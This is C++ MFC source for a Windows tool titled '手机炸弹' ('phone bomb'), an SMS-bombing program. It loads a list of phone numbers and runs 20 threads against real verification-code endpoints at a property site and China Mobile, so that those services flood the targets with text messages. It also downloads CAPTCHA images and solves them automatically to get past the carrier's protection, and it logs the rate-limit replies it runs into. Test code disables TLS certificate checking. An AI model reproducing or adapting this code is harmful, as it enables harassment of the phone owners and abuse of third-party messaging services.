// MobileBombDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "MobileBomb.h"
#include "MobileBombDlg.h"
#include "CtrlFile/WebBase.h"
#include <afxinet.h>
#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
END_MESSAGE_MAP()


// CMobileBombDlg 对话框




CMobileBombDlg::CMobileBombDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CMobileBombDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	
}

void CMobileBombDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_PHONE, m_PhoneList);
}

BEGIN_MESSAGE_MAP(CMobileBombDlg, CDialog)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDC_BTN_START, &CMobileBombDlg::OnBnClickedBtnStart)
	ON_BN_CLICKED(IDC_BTN_IMPORT, &CMobileBombDlg::OnBnClickedBtnImport)
	ON_BN_CLICKED(IDC_BTN_STOP, &CMobileBombDlg::OnBnClickedBtnStop)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_BUTTON1, &CMobileBombDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &CMobileBombDlg::OnBnClickedButton2)
	ON_BN_CLICKED(IDC_BUTTON3, &CMobileBombDlg::OnBnClickedButton3)
END_MESSAGE_MAP()


// CMobileBombDlg 消息处理程序

BOOL CMobileBombDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标
	m_bRunFlag = false;
	for (int i=0;i<20;i++)
	{
		m_pRumThread[i] = NULL;
	}
	InitCtrList();
	SetWindowText("手机炸弹");
	m_PhoneList.MoveWindow(10,10,600,300);
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CMobileBombDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CMobileBombDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标显示。
//
HCURSOR CMobileBombDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CMobileBombDlg::SendMessageEx()
{
	if (!m_bRunFlag)
	{
		return;
	}
	CString strMobile = "";
	int iRet = GetSendPack(strMobile);
	if (iRet < 0)
	{
		Sleep(600);
		return;
	}
	CWebBase objWeb(50);
	string strServer = "rent.sz.soufun.com";
	string strHeader = "Content-Type: application/x-www-form-urlencoded";
	strHeader.append("\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 1.1.4322)");
	strHeader.append("\r\nAccept: */*");
	strHeader.append("\r\nConnection: Keep-Alive");
	srand(time(NULL));
	iRet  = -1;
	int iLoopCount = 0;
	CString strFailReason = "";
	/************************************************************************/
	/* SOUFUN BEGIN                                                         */
	/************************************************************************/
	while (true)
	{
		if (!m_bRunFlag)
		{
			return;
		}
		Sleep(10);
		if (iLoopCount > 10)
		{
			strFailReason = "超过循环次数";
			AddSendResult(strMobile,false,strFailReason);
			break;
		}
		CString strFormat = "";
		strFormat.Format("/rent/PostService/Phone_RangNum.aspx?action=number&mobile=%s&randstr=%d%d",strMobile,rand()%10000,GetTickCount());				
		iRet = objWeb.GetPage(strFormat,strHeader.c_str(),strServer.c_str());
		if (iRet < 0)
		{
			iLoopCount++;
			continue;
		}
		CString strRet = CString(objWeb.GetContentInfo());
		if (strRet.Find("\"成功\"") >=0 )
		{
			AddSendResult(strMobile,true,"");
		}
		else if (strRet.Find("每个手机号当天只能申请3次") >= 0)
		{			
			strFailReason = "每个手机号当天只能申请3次";
			AddSendResult(strMobile,false,strFailReason);
			break;
		}
	}
	iLoopCount = 0;
	/************************************************************************/
	/* SOUFUN END                                                           */
	/************************************************************************/	
	MobileMusicSend(strMobile);
}

/************************************************************************/
/*                                                                      */
/************************************************************************/
void CMobileBombDlg::AddSendResult(CString strPhone,bool bSuc,CString strResult)
{
	map<CString,int>::iterator it = m_mapPhoneList.find(strPhone);
	if (it == m_mapPhoneList.end())
	{
		return;
	}
	int iItemNum = it->second;
	
	CString strFailNum = m_PhoneList.GetItemText(iItemNum,3);
	m_PhoneList.SetItemText( iItemNum , 1, CTime::GetCurrentTime().Format("%Y-%m-%d %H:%M:%S"));	
	if (bSuc)
	{
		CString strSucNum = m_PhoneList.GetItemText(iItemNum,2);
		strSucNum.Format("%d",atoi(strSucNum)+1);
		m_PhoneList.SetItemText( iItemNum , 2, strSucNum );
	}
	else
	{
		CString strFailNum = m_PhoneList.GetItemText(iItemNum,3);
		strFailNum.Format("%d",atoi(strFailNum)+1);
		m_PhoneList.SetItemText( iItemNum , 3, strFailNum );
		m_PhoneList.SetItemText( iItemNum , 4, strResult );
	}
}

void CMobileBombDlg::MobileMusicSend(CString strMobile)
{
	CWebBase objWeb(50);
	objWeb.SetNoCookie(true);
	string strServer = "mdll.10086.cn";
	string strHeader = "x-flash-version: 10,1,102,64";
	strHeader.append("\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 1.1.4322)");
	strHeader.append("\r\nAccept: */*");
	strHeader.append("\r\nConnection: Keep-Alive");
	
	srand(time(NULL));

	string strFilePath = objWeb.GetAppPath();
	char szFileName[100] = {0};
	sprintf(szFileName,"pic%d.bmp",GetCurrentThreadId());
	strFilePath.append(szFileName);
	int iRet  = -1;
	int iLoopCount = 0;
	CString strFailReason = "";
	/************************************************************************/
	/* SOUFUN BEGIN                                                         */
	/************************************************************************/
	while (true)
	{
		if (!m_bRunFlag)
		{
			return;
		}
		Sleep(10);
		if (iLoopCount > 10)
		{
			strFailReason = "超过循环次数";
			AddSendResult(strMobile,false,strFailReason);
			break;
		}
		CString strFormat = "";
		strFormat.Format("/newweb/jsp/common/validatecodeFlash.jsp?0.%d%d%d",rand()%10000,GetTickCount(),rand()%1000);				
		iRet = objWeb.GetPage(strFormat,strHeader.c_str(),strServer.c_str(),80,true,strFilePath.c_str());
		if (iRet < 0)
		{
			iLoopCount++;
			continue;
		}
		//已经得到验证码
		CCodeCheck objCheck;
		string strRetCode = objCheck.CheckCode(strFilePath);
		//验证码已经得到
		if (strRetCode.length() != 4)
		{
			continue;
		}
		string strHeaderEx = strHeader;
		strHeaderEx.append("\r\nCookie:"+objWeb.GetCookie());
		strFormat.Format("/newweb/jsp/ordertone/getvalidate.jsp?jsonString={\"mobile\":\"%s\",\"salesid\":\"0\",\"singid\":\"0\",\"imgpass\":\"%s\"}",strMobile,strRetCode.c_str());
		iRet = objWeb.GetPage(strFormat,strHeader.c_str(),strServer.c_str());
		if (iRet < 0)
		{
			iLoopCount++;
			continue;
		}
		
		CString strRet = CString(objWeb.GetContentInfo());
		ConvertUtf8ToGBK(strRet);

		if (strRet.Find("\"下发验证码成功\"") >=0 )
		{
			AddSendResult(strMobile,true,"");
			int i=0;
			while(m_bRunFlag && i++<121)
				Sleep(500);	
		}
		else if (strRet.Find("尊敬的用户,您获得短信验证码的频率过快,请1分钟后再试,谢谢") >= 0)
		{
			strFailReason = "验证码的频率过快";
			AddSendResult(strMobile,false,strFailReason);  
			int i=0;
			while(m_bRunFlag && i++<121)
				Sleep(500);			
		}
		else if(strRet.Find("尊敬的用户,您获得短信验证码的总次数已经超过20次限制,请稍后再试,谢谢") >= 0)
		{
			strFailReason = "已经超过20次限制";
			AddSendResult(strMobile,false,strFailReason);
			break;
		}
		else
		{
			AddSendResult(strMobile,false,strRet.Left(30));
		}
		//break;
	}
	iLoopCount = 0;
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
void CMobileBombDlg::OnBnClickedBtnStart()
{
	if (m_bRunFlag)
	{
		return;
	}
	m_bRunFlag = true;
	for (int i=0;i<20;i++)
	{
		m_pRumThread[i] = AfxBeginThread((AFX_THREADPROC)RunThreadProc, (LPVOID)this);
	}
	
	GetDlgItem(IDC_BTN_START)->EnableWindow(FALSE);
	GetDlgItem(IDC_BTN_STOP)->EnableWindow(TRUE);
}

void CMobileBombDlg::InitCtrList()
{
	DWORD dwSytle=::GetWindowLong(m_PhoneList.m_hWnd,GWL_STYLE);
	//设置为报表形式
	SetWindowLong(m_PhoneList.m_hWnd,GWL_STYLE,dwSytle|LVS_REPORT);
	DWORD ExStyle=m_PhoneList.GetExtendedStyle();
	m_PhoneList.SetExtendedStyle(ExStyle|LVS_EX_FULLROWSELECT|LVS_EX_GRIDLINES);
	::SendMessage(m_PhoneList.m_hWnd, LVM_SETEXTENDEDLISTVIEWSTYLE,
		LVS_EX_FULLROWSELECT, LVS_EX_FULLROWSELECT);
	m_PhoneList.InsertColumn(0,_T("手机号码"),LVCFMT_LEFT,100);
	m_PhoneList.InsertColumn(1,_T("发送时间"),LVCFMT_LEFT,150);
	m_PhoneList.InsertColumn(2,_T("成功次数"),LVCFMT_LEFT,60);
	m_PhoneList.InsertColumn(3,_T("失败次数"),LVCFMT_LEFT,60);
	m_PhoneList.InsertColumn(4,_T("失败原因"),LVCFMT_LEFT,200);
}

void CMobileBombDlg::OnBnClickedBtnImport()
{
	char szFilter[255] = {0};
	CString strPath = "";
	strcpy(szFilter,"Text files(*.txt)|*.txt");
	CFileDialog dlg(1,NULL,NULL,NULL,szFilter); 
	if(dlg.DoModal()==IDOK) 
	{
		strPath = dlg.GetPathName();
	}
	strPath.Trim();
	if (strPath == "")
	{
		return;
	}
	CStdioFile   file;
	CString   cstr = "";
	CFileException   fe;
	int iNum = 0;
	if(file.Open(strPath,CFile::modeRead,&fe))   
	{
		file.SeekToBegin();
		m_mapPhoneList.clear();
		m_PhoneList.DeleteAllItems();
		while (file.ReadString(cstr))
		{
			cstr.Trim();
			if (cstr != "")
			{
				int nCount = m_PhoneList.GetItemCount();
				map<CString,int>::iterator it = m_mapPhoneList.find(cstr);
				if (it != m_mapPhoneList.end())
				{
					continue;
				}
				m_mapPhoneList[cstr] = nCount;
				m_SendList.Add(cstr);
				m_PhoneList.InsertItem( nCount,cstr);
				m_PhoneList.SetItemText(nCount,2,"0");
				m_PhoneList.SetItemText(nCount,3,"0");
			}				
		}
	}
}

/************************************************************************/
/*                                                                      */
/************************************************************************/
//线程函数
void CMobileBombDlg::RunThreadProc(LPVOID lpParam)
{
	CMobileBombDlg *pThis = (CMobileBombDlg *)lpParam;
	pThis->RunProc(); 
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
//线程执行函数
void CMobileBombDlg::RunProc()
{
	while(true)
	{
		if (!m_bRunFlag)
		{
			return;
		}
		SendMessageEx();
	}
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
void CMobileBombDlg::OnBnClickedBtnStop()
{
	m_bRunFlag = false;
	for (int i=0;i<20;i++)
	{
		if (m_pRumThread[i] == NULL)
		{
			continue;
		}
		DWORD dRet = ::WaitForSingleObject(m_pRumThread[i]->m_hThread,5000);
		if (dRet == WAIT_TIMEOUT)
		{
			::TerminateThread(m_pRumThread[i]->m_hThread,0);
		}
	}	
	GetDlgItem(IDC_BTN_START)->EnableWindow(TRUE);
	GetDlgItem(IDC_BTN_STOP)->EnableWindow(FALSE);
}

void CMobileBombDlg::OnClose()
{
	OnBnClickedBtnStop();
	CDialog::OnClose();
}


/************************************************************************/
/*                                                                      */
/************************************************************************/
//添加等待发送缓冲数据
void CMobileBombDlg::AddRealSendPack(CString &sendPack)
{
	m_SendLock.Lock();
	try
	{		
		m_SendList.Add(sendPack);
	}
	catch(...)
	{
		
	}
	m_SendLock.Unlock();
	return;
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
//获取等待发送信息进行发送
int CMobileBombDlg::GetSendPack(CString &sendPack)
{
	int iRet = 0;
	m_SendLock.Lock();
	try
	{		
		int iSize = m_SendList.GetSize();
		if (iSize == 0)	//缓冲区无数据
		{
			iRet = -1;
		}
		else
		{
			sendPack = m_SendList.GetAt( 0 );
			m_SendList.RemoveAt( 0 );
			iRet = 0;	//正常获取到数据
		}		
	}
	catch(...)
	{
		iRet = -2;		//出错
	}
	m_SendLock.Unlock();
	return iRet;
}
void CMobileBombDlg::OnBnClickedButton1()
{
	m_bRunFlag = true;
	//MobileMusicSend("15019212360");return;
	CWebBase objWeb(50);
	for (int i=0;i<1;i++)
	{
		char szPath[260] = {0};
		sprintf(szPath,"E:\\MobileBomb\\MobileBomb\\out\\pic300.bmp",i);
		CCodeCheck objCheck;
		string sstrRet = objCheck.CheckCode(string(szPath));
		AfxMessageBox(sstrRet.c_str());
	}
	
	
	return;
	
	string strServer = "mdll.10086.cn";
	string strHeader = "x-flash-version: 10,1,102,64";
	strHeader.append("\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 1.1.4322)");
	strHeader.append("\r\nAccept: */*");
	strHeader.append("\r\nConnection: Keep-Alive");
	srand(time(NULL));
	int iRet  = -1;
	int iLoopCount = 0;
	CString strFailReason = "";
	CString strFormat = "";
	strFormat.Format("/newweb/jsp/common/validatecodeFlash.jsp?0.%d%d%d",rand()%10000,GetTickCount(),rand()%1000);				
	iRet = objWeb.GetPage(strFormat,strHeader.c_str(),strServer.c_str(),80,true,"c:\\test.bmp");
	if (iRet < 0)
	{
		return;
	}
	CString strRet = CString(objWeb.GetContentInfo());
	if (strRet.Find("\"成功\"") >=0 )
	{
		AddSendResult("",true,"");
	}
	else if (strRet.Find("每个手机号当天只能申请3次") >= 0)
	{			
		strFailReason = "每个手机号当天只能申请3次";
		AddSendResult("",false,strFailReason);
	}
}

void CMobileBombDlg::ConvertUtf8ToGBK(CString& strUtf8) 
{
	int len = 0;
	unsigned short * wszGBK = NULL;
	char * szGBKt = NULL;
	char * szGBKs = NULL;

	len = MultiByteToWideChar(CP_UTF8, 0, (LPCTSTR)strUtf8, -1, NULL,0);
	wszGBK = new unsigned short[len+1];
	memset(wszGBK, 0, len * 2 + 2);
	MultiByteToWideChar(CP_UTF8, 0, (LPCTSTR)strUtf8, -1, (LPWSTR)wszGBK, len);

	len = WideCharToMultiByte(CP_ACP, 0, (LPWSTR)wszGBK, -1, NULL, 0, NULL, NULL); 
	szGBKt  =new char[len + 1];
	memset(szGBKt, 0, len + 1);
	WideCharToMultiByte (CP_ACP, 0, (LPWSTR)wszGBK, -1, szGBKt, len, NULL,NULL);

	szGBKs  =new char[len + 1];
	memset(szGBKs, 0, len + 1);
	//转换Gb码繁体到Gb码简体，使用API函数LCMapString 
	LCMapString( 0x0804, LCMAP_SIMPLIFIED_CHINESE, szGBKt, -1, szGBKs, len);
	strUtf8 = szGBKs;
	delete[] szGBKs;
	delete[] szGBKt;
	delete[] wszGBK;
}
void CMobileBombDlg::OnBnClickedButton2()
{
	A a[10];
	int ii = sizeof(a);
}

void CMobileBombDlg::OnBnClickedButton3()
{
	

	//return;
	CWebBase objWeb(50);
	objWeb.SetHttpType(0);

	CInternetSession session;

	CHttpConnection* pConnection = session.GetHttpConnection("web1800jrl", INTERNET_FLAG_NO_AUTO_REDIRECT,
		443, NULL, NULL);


	CHttpFile *pHttpFile = NULL;
// 	DWORD dwFlagsEx;
// 	DWORD dwBuffLen = sizeof(hRequest);
// 	InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&dwFlagsEx, &dwBuffLen);
// 	dwFlagsEx |= SECURITY_IGNORE_ERROR_MASK;
// 	InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlagsEx, sizeof(dwFlagsEx) );

	pHttpFile = pConnection->OpenRequest(_T("GET"), "/Web1800v2/Status.asmx", NULL, 1, NULL, NULL,
			INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_RELOAD |
			INTERNET_FLAG_EXISTING_CONNECT | INTERNET_FLAG_TRANSFER_ASCII | INTERNET_FLAG_SECURE |
			SECURITY_IGNORE_ERROR_MASK);
		//add by shaojun at 2010-09-07 当指针非法时，退出			
		if (pHttpFile == NULL)
		{
			return ;
		}
		//HINTERNET hRequest = pHttpFile->
		
		DWORD dwFlagsEx;
		DWORD dwBuffLen = sizeof(dwFlagsEx);
		/*InternetQueryOptionA(pHttpFile->m_hFile, INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&dwFlagsEx, &dwBuffLen);
		dwFlagsEx |= SECURITY_IGNORE_ERROR_MASK;
		InternetSetOptionA(pHttpFile->m_hFile, INTERNET_OPTION_SECURITY_FLAGS, &dwFlagsEx, sizeof(dwFlagsEx) );*/
		pHttpFile->QueryOption(INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&dwFlagsEx, &dwBuffLen);
		dwFlagsEx |= SECURITY_IGNORE_ERROR_MASK;
		pHttpFile->SetOption(INTERNET_OPTION_SECURITY_FLAGS, &dwFlagsEx, sizeof(dwFlagsEx));
		// /Web1800v2/Status.asmx
		CString strRequest = "/Web1800v2/Status.asmx";
		pHttpFile->SendRequest(NULL, 0, (LPVOID)(LPCTSTR)"", 0);

		DWORD dwStatusCode = HTTP_STATUS_OK;
		pHttpFile->QueryInfoStatusCode(dwStatusCode);

		// strResponse
		if (dwStatusCode == HTTP_STATUS_OK)
		{
			if (HTTP_STATUS_OK == dwStatusCode)
			{
				CString strBuf = _T("");
				CString strResponse = _T("");
				while (pHttpFile->ReadString(strBuf))
				{
					strResponse += strBuf + "\r\n";
				}
				strResponse = strResponse.Left(strResponse.GetLength() - 2);
			}
		}

//	CHttpFile* pHttpFile = NULL;
	DWORD dwFlags = 0;
	dwFlags = INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_RELOAD;
	
	dwFlags = dwFlags |
		INTERNET_FLAG_SECURE |
		SECURITY_IGNORE_ERROR_MASK ;
	pHttpFile = (CHttpFile* )session.OpenURL("https://web1800jrl/Web1800v2/Status.asmx", 1, INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_RELOAD |
		INTERNET_FLAG_EXISTING_CONNECT | INTERNET_FLAG_TRANSFER_ASCII | INTERNET_FLAG_SECURE |
		SECURITY_IGNORE_ERROR_MASK);
//	DWORD dwStatusCode = HTTP_STATUS_OK;
	pHttpFile->QueryInfoStatusCode(dwStatusCode);

	if (HTTP_STATUS_OK == dwStatusCode)
	{
		CString strBuf = _T("");
		CString strResponse = _T("");
		while (pHttpFile->ReadString(strBuf))
		{
			strResponse += strBuf + "\r\n";
		}
		strResponse = strResponse.Left(strResponse.GetLength() - 2);
	}


	return;
	//https://mybank.icbc.com.cn/icbc/perbank/index.jsp
	string strServer = "web1800jrl";
	//strServer = "mybank.icbc.com.cn";
	string strHeader = "";
	strHeader.append("User-Agent:Web1800");
	strHeader.append("\r\nAccept: */*");
	strHeader.append("\r\nConnection: Keep-Alive");
	srand(time(NULL));
	int iRet  = -1;
	int iLoopCount = 0;
	CString strFailReason = "";
	CString strFormat = "";
	strFormat.Format("/Web1800v2/Status.asmx?0.%d%d%d",rand()%10000,GetTickCount(),rand()%1000);	
	//strFormat = "/icbc/perbank/index.jsp";
	//iRet = objWeb.GetPage(strFormat,strHeader.c_str(),strServer.c_str(),80,false,"");
	int iHttpsType = ((CButton*)GetDlgItem(IDC_CHECK1))->GetCheck();
	if (iHttpsType == 1)
	{
		objWeb.SetHttpType(0);
		iRet = objWeb.GetPage(strFormat,strHeader.c_str(),strServer.c_str(),443,false,"");
		CString strError = CString(objWeb.GetLastErrorInfo());
	}
	else
	{
		objWeb.SetHttpType(1);
		iRet = objWeb.GetPage(strFormat,strHeader.c_str(),strServer.c_str(),80,false,"");
	}	
	if (iRet < 0)
	{
		return;
	}
	CString strRet = CString(objWeb.GetContentInfo());
	
}

